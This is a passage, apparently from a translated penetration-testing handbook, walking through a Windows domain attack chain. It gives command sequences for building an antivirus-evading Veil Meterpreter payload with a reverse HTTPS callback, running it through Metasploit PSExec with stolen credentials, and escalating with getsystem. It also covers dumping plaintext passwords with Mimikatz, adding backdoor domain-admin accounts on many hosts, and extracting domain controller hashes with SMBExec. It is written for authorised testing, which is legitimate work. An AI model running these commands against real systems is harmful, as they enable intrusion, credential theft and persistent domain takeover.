
# Veil Payload Generation and Metasploit Integration

## Veil Payload Generation

### Initial Setup
运行 `./Veil.py` 启动 Veil。

在本例中，我们将使用 `MeterHTTPSContained` payload，输入以下命令选择：
*   `use 20`

![Figure 67 - Veil Start Up Screen](images/00115.jpeg)

### 配置监听器
与 Metasploit 类似，我们需要设置 `LHOST` 和 `LPORT`。本例中攻击机 IP 为 `192.168.75.131`，`LPORT` 设为 `443`（模拟 SSL 流量）。

*   `set LHOST 192.168.75.131`
*   `set LPORT 443`

### 生成 Payload
配置完成后，输入以下命令生成 payload：
*   `generate`

![Figure 68 - Configuring Veil](images/00116.jpeg)

### 选择编译器
使用默认的 `pyinstaller` 进行编译：

![Figure 69 - Veil and the Power of Python](images/00117.jpeg)

生成的可执行文件位于 `/root/veil-output/compiled/` 目录下。

## Metasploit 配置与 PSExec 攻击

现在我们已拥有一个可绕过 AV 的 payload，接下来配置 Metasploit。启动 `msfconsole` 后，使用 `PSExec` 模块。设置 exploit、payload、`LHOST`、`LPORT`（需与 Veil 生成的 payload 一致）、`SMBUser`、`SMBPass`、`SMBDomain` 和 `RHOST` 等标准选项。关键区别在于使用 `set EXE::Custom` 指定 Veil 生成的自定义 payload。

完整命令序列如下：

*   `msfconsole`
*   `use exploit/windows/smb/psexec`
*   `set PAYLOAD windows/meterpreter/reverse_https`
*   `set LHOST [IP of My Box]`
*   `set LPORT 443`
*   `set SMBUser TestAccount`
*   `set SMBPass MyPassword`
*   `set SMBDomain fakeDomain`
*   `set EXE::Custom /root/veil-output/compiled/updater12.exe`
*   `set RHOST [IP of Remote Host]`
*   `exploit`

![Figure 70 - Using the Veil Payload within PSExec](images/00118.jpeg)

执行 `exploit` 后，PSExec 将登录受害主机并执行自定义 payload。

![Figure 71 - Reverse HTTPS Handler](images/00119.jpeg)

获得 Meterpreter 会话后，使用以下命令进行交互：
*   `sessions -i [session number]`

## Mimikatz 凭证导出

### 进程迁移
回顾上一节提到的在内存中运行 Mimikatz。若目标为 64 位系统，必须先迁移至 64 位进程，因为只有 64 位进程才能从 64 位系统内存中读取明文密码。32 位系统虽可迁移但非必须。

使用 `ps` 列出进程，使用 `migrate [pid]` 进行迁移。下例中识别出运行中的 64 位 `Notepad` 进程并迁移至该进程。

*   `ps`
*   `migrate [pid of a x86_64 process]`

### 权限提升
执行上述命令前可能需要 `SYSTEM` 权限。使用以下命令尝试提权：
*   `getsystem`
*   若被拒绝且为本地管理员，请参考绕过 UAC 章节。

### 导出凭证
成功迁移并以 `SYSTEM` 权限运行后，加载 Mimikatz 并执行 `kerberos`（或 `wdigest`）命令以获取当前登录用户的明文密码。

*   `kerberos`
*   `wdigest`

![Figure 72 - Mimikatz](images/00120.jpeg)

现获得另一组可用的账号密码。除 Mimikatz 外，Metasploit 还有其他后渗透模块值得关注，如 `Incognito` ([http://www.offensive-security.com/metasploit-unleashed/Fun_With_Incognito](http://www.offensive-security.com/metasploit-unleashed/Fun_With_Incognito)) 和 `Smart_HashDump` ([http://www.darkoperator.com/blog/2011/5/19/metasploit-post-module-smart_hashdump.html](http://www.darkoperator.com/blog/2011/5/19/metasploit-post-module-smart_hashdump.html))，但目前的访问权限已足够。

## PSExec 批量命令执行 (Kali Linux)

拥有本地管理员或域管理员凭证后，有时无需完全控制每台主机，只需在其上执行命令。常见批量执行命令示例：

*   `net group "Domain Admins" /domain` (列出所有域管理员)
*   `qwinsta` (列出用户会话信息)
*   在所有主机创建额外管理员账号：
    *   `net user username password /ADD /DOMAIN`
    *   `net group "Domain Admins" username /ADD /DOMAIN`
    *   `net localgroup Administrators username /ADD`

Royce Davis 修改了原版 `psexec` 代码，使其不上传二进制文件即可实现内存中的命令行远程代码执行，从而绕过 AV 检测，并支持对多系统进行线程化命令执行。示例如下：

*   `use auxiliary/admin/smb/psexec_command`
*   `set RHOSTS [IP or IP Range]`
*   `set SMBDomain [Domain Info]`
*   `set SMBPass [Password]`
*   `set SMBUser [User]`
*   `set COMMAND [command you want to run at the command line]`
*   `exploit`

![Figure 73 - qwinsta](images/00121.jpeg)

回顾搭建环境阶段启用 Metasploit 日志记录的选项，这在大规模执行时非常有用。若对 `/24` 或更大网段执行代码，输出会非常庞大。启用日志记录并 `grep` 日志文件可大幅简化分析。^([13](#part0018.html#id_25)) 上例中在每台主机运行 `qwinsta` 并关联 IP 与用户名。若拥有 IT 管理员名单，可直接针对其主机发起攻击，而非渗透全网主机。

![Figure 74 - SMBExec](images/00122.jpeg)

## 域控制器哈希导出

若幸运获得本地管理员或域管理员账号，下一目标通常是域控制器 (DC)。成功从 DC 导出所有哈希是渗透测试人员的高光时刻。

即使拥有管理员凭证，也无法直接读取 `c:\Windows\NTDS\ntds.dit` 中存储的哈希，因为 Active Directory 持续访问该文件导致其被读锁定。解决方案是利用 Windows 原生的卷影复制功能创建该文件副本。^([14](#part0018.html#id_23))

### SMBExec (Kali Linux)

`SMBExec` ([https://github.com/brav0hax/smbexec](https://github.com/brav0hax/smbexec)) 由 `brav0hax` 开发^([15](#part0018.html#id_21))，利用卷影复制功能获取 `SYS` 注册表配置单元和 `ntds.dit` 文件。以下是安装阶段部署的 SMBExec 模块用法：

*   **运行 SMBExec**
    *   `cd /opt/smbexec`
    *   `./smbexec`
*   选择 `3` (Obtain Hashes)
*   选择 `2` (Domain Controllers)
*   提供用户名/哈希/域/IP/NTDS 驱动器/NTDS 路径

![Figure 75 - SMBExec](images/00123.jpeg)

SMBExec 使用有效凭证连接 DC，验证路径，尝试创建 `ntds.dit` 和 `sys` 文件的卷影复制。完成后解析文件，收集并存储 LDAP 中的所有密码哈希。

执行成功后，SMBExec 会在同级目录下创建基于时间戳的文件夹，内含 `[domain]-dc-hashes.lst` 文件。

![Figure 76 - SMBExec Results](images/00124.jpeg)
